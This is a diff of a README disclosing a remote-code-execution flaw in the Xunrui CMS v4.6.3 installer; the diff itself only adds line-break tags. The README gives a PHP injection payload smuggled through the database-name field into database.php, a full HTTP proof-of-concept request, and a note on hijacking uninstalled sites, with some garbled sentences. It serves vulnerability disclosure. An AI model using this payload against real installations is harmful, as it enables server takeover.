@@ -1,16 +1,16 @@
-# xunruicms_rce
-The RCE is connected through the CMS installation interface
-# Xunrui CMS Installation Vulnerability
+# xunruicms_rce<br>
+The RCE is connected through the CMS installation interface<br>
+# Xunrui CMS Installation Vulnerability<br>
 
 ## Affected Range:
-- Xunrui CMS Website Edition/Popular Edition v4.6.3 (2024-12-17)
+- Xunrui CMS Website Edition/Popular Edition v4.6.3 (2024-12-17)<br>
 
 ## Payload:
 ``` exp;-- ---'];phpinfo();['```
 
-###Vulnerability Reproduction:
-Normal installation of .database.php
-During installation, the process immediately jumps to step 3.
+###Vulnerability Reproduction:<br>
+Normal installation of .database.php<br>
+During installation, the process immediately jumps to step 3.<br>
 File After Successful Exploitation:
 ![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%871.png)
 ![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%872.png)
@@ -19,23 +19,23 @@ File After Successful Exploitation:
 The file after exploitation shows how the vulnerability is exploited.
 
 #Code Analysis:
-In tracing the code, it is found that the issue occurs when writing to . 
+In tracing the code, it is found that the issue occurs when writing to . <br>
 
 ![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%875.png)
 ![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%876.png)
 ![image](https://github.com/trymonoly/xunruicms_rce/blob/main/%E5%9B%BE%E7%89%877.png)
-The variable is set to the database name provided by the user, which is controllable.database.php$data['db_name']
-However, bypassing the database creation query is required.
+The variable is set to the database name provided by the user, which is controllable.database.php$data['db_name']<br>
+However, bypassing the database creation query is required.<br>
 
 ###Code Flow:
-The code checks for the support of the MySQLi component and attempts to connect to MySQL.
-The second checks if the entered database name exists. If not, it executes an unfiltered SQL statement. At this point, entering a new database name can bypass the detection, allowing an SQL query to be executed.elseifCREATE TABLE
-Thus, the exploit is:
+The code checks for the support of the MySQLi component and attempts to connect to MySQL.<br>
+The second checks if the entered database name exists. If not, it executes an unfiltered SQL statement. At this point, entering a new database name can bypass the detection, allowing an SQL query to be executed.elseifCREATE TABLE<br>
+Thus, the exploit is:<br>
 ```exp;-- ---'];phpinfo();['```
-###Dynamic Analysis:
-If the SQL query is successfully executed, the rest of the process proceeds smoothly.
-The function is used to write to , achieving Remote Code Execution (RCE).file_put_contentsdatabase.php
-###Proof of Concept (PoC):
+###Dynamic Analysis:<br>
+If the SQL query is successfully executed, the rest of the process proceeds smoothly.<br>
+The function is used to write to , achieving Remote Code Execution (RCE).file_put_contentsdatabase.php<br>
+###Proof of Concept (PoC):<br>
 ```
 POST /index.php?c=install&m=index&is_install_db=0&step=2 HTTP/1.1
 Host: 192.168.1.7:8888
@@ -54,6 +54,6 @@ Connection: close
 is_form=1&is_admin=0&is_tips=&csrf_test_name=9e9016fb5bc3f485a8e925a7c5c91234&data%5Bname%5D=%E6%88%91%E7%9A%84%E9%A1%B9%E7%9B%AE&data%5Bemail%5D=admin%40admin.com&data%5Busername%5D=admin&data%5Bpassword%5D=admin&data%5Bdb_host%5D=127.0.0.1&data%5Bdb_user%5D=root&data%5Bdb_pass%5D=123456&data%5Bdb_name%5D=ee5%3B--+---'%5D%3Bphpinfo()%3B%5B'&data%5Bdb_prefix%5D=dr_&is_install_db=1
 ```
 
-###Reproduce the Issue:
-1.Remotely connect to the attacker's database.
-2.The other party did not install the CMS, and did not generate the lock file.
+###Reproduce the Issue:<br>
+1.Remotely connect to the attacker's database.<br>
+2.The other party did not install the CMS, and did not generate the lock file.<br>
